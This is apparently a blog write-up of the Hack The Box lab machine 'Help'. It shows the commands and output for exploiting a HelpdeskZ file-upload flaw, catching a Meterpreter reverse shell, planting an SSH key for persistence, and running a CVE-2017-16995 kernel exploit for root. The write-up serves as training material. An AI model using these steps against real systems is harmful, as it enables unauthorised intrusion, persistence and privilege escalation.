---
layout: single
title: Help - Hack The Box
excerpt: "Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn't delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE."
date: 2019-06-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-help/help_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - php  
  - apache
  - kernel exploit
  - helpdeskz
---

![](/assets/images/htb-writeup-help/help_logo.png)

Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn't delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE.

## Summary

- The HelpdeskZ PHP application allows .php file uploads to be stored even though there is an error message saying an invalid file has been uploaded. The PHP code doesn't clean up the invalid file that has been uploaded.
- We can't simply execute the uploaded file because the filename stored is obfuscated with the MD5 of the original file + the epoch timestamp. We can bruteforce those with an exploit already available.
- After getting a shell through RCE using the uploaded file, we execute a kernel exploit for CVE 2017-16995 and gain root access.

## Blog / Tools used

- [HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download](https://www.exploit-db.com/exploits/41200)
- [Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation](https://www.exploit-db.com/exploits/44298)

### Portscan

Not much running on there, it's a Linux box with few services running:

```
root@ragingunicorn:~# nmap -p- -sC -sV 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-19 19:02 EST
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.030s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration Node.js

![](/assets/images/htb-writeup-help/5.png)

There's some kind of Node.js application with graphql running on port 3000 but there's not much we can do with it.

Fails:
- Tried enumerating ednpoints with wfuzz, didn't find anything
- Once I had access to the server later on I was able to find the `graphql` endpoint but couldn't anything special with it other then querying user information which I already access to locally. The username/password shown here was not used anywhere on the box, just a distraction.

### Web enumeration Apache

The main page shows the default Ubuntu Apache page:

![](/assets/images/htb-writeup-help/1.png)

Next, when we run `gobuster` we find the `/support` URI:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -t 50 -u http://help.htb
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
```

This points to the **HelpdeskZ** application running on the server.

![](/assets/images/htb-writeup-help/2.png)

![](/assets/images/htb-writeup-help/3.png)

There's nothing in the Knowledge Base or News section, and we can't log in because we don't have credentials.

A quick search on Exploit-DB shows there's a vulnerability related to file uploads:

```
root@ragingunicorn:~# searchsploit helpdeskz
------------------------------------------------
 Exploit Title  |  Path  | (/usr/share/exploitdb/)
------------------------------------------------
HelpDeskZ 1.0.2 - Arbitrary File | exploits/php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File | exploits/php/webapps/41200.py
------------------------------------------------
Shellcodes: No Result
```

Exploit: `https://www.exploit-db.com/exploits/40300`

Basically, when we upload an attachment in a support ticket, the filename is obfuscated by doing an MD5 checksum of the filename concatenated with the epoch time. Because the code uses an integer for the epoch time (instead of a float), we can bruteforce the values by computing the MD5 value of every filename/time combination from the past few minutes and issue a GET request to the server to find if the filename is correct.

Looking the HelpdeskZ code, we can see that the upload folder is `/support/uploads/tickets/`, this will need to be passed to the exploit script to bruteforce the correct path.

![](/assets/images/htb-writeup-help/6.png)

![](/assets/images/htb-writeup-help/7.png)

We also need to make sure that the time on our computer is set to same time as the server, or close enough so the script will be able to cycle through the epoch time that matches the upload timestamp.

```
# date && curl -v --head http://help.htb/
Sun Jan 20 09:33:00 EST 2019
*   Trying 10.10.10.121...
* TCP_NODELAY set
* Connected to help.htb (10.10.10.121) port 80 (#0)
> HEAD / HTTP/1.1
> Host: help.htb
> User-Agent: curl/7.62.0
> Accept: */*
> 
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Sun, 20 Jan 2019 14:32:37 GMT
Date: Sun, 20 Jan 2019 14:32:37 GMT
```

For the reverse shell, we can can use a simple `php/meterpreter/reverse_tcp` shell and attach it to a support ticket:

![](/assets/images/htb-writeup-help/8.png)

![](/assets/images/htb-writeup-help/9.png)

It seems that some extensions are blacklisted or whitelisted on the server. But if we look at the source code on Github, we notice that even when we get an error message, there is no code that deletes the invalid file. The file is still saved on the server even if we get an error message.

![](/assets/images/htb-writeup-help/10.png)

To run the exploit, we just give it the upload location and the filename we uploaded:
```
# ./40300.py http://help.htb/support/uploads/tickets/ cmd.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
```

Once the script hits the right filename, the payload is triggered and we get a shell:
```
msf5 exploit(multi/handler) >
[*] Sending encoded stage (51106 bytes) to 10.10.10.121
[*] Meterpreter session 1 opened (10.10.14.23:5555 -> 10.10.10.121:35166) at 2019-01-20 09:35:45 -0500
```

Now we can grab the flag and write our SSH key to the user folder so we can log in by SSH after:
```
meterpreter > shell
Process 17138 created.
Channel 0 created.
cd /home/help
cat user.txt
bb8a7b....
mkdir .ssh
echo "ssh-rsa AAAAB3NzaC1y[...]hscPOtelvd root@ragingunicorn" >> .ssh/authorized_keys
```

### Privesc

Since this is a low point box, the priv esc is probably something simple such as kernel exploit.

We get a bunch of results when we run the [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

```
[...]
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Tags: debian=9,fedora=25|26|27,[ ubuntu=14.04|16.04|17.04 ]
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
[...]
```

We can exploit CVE 2017-16995 to gain root access. According to the CVE's description:

> The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.

Exploiting it was easy:

```
help@help:~$ cd /dev/shm
help@help:/dev/shm$ vi exp.c
help@help:/dev/shm$ gcc -o exp exp.c
help@help:/dev/shm$ ./exp
task_struct = ffff880039afd400
uidptr = ffff880036b75b04
spawning root shell
root@help:/dev/shm# cat /root/root.txt
b7fe60...
```
